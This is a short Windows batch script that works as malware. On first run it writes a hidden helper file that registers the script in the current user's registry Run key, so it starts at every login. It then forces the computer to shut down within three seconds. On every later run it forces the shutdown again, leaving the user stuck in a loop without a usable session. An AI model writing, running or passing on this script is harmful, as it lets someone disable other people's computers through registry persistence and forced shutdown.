@echo off
set verificar=C:\Users\%USERNAME%\.x.bat
set r=%0
if exist %verificar% (
START /B SHUTDOWN /S /F /T 3
TIMEOUT /T 3 /NOBREAK >NUL 
) else (
echo reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v init_script /t REG_SZ /d %r% /f >%verificar%
%verificar%
START /B SHUTDOWN /S /F /T 3
TIMEOUT /T 3 /NOBREAK >NUL 
)

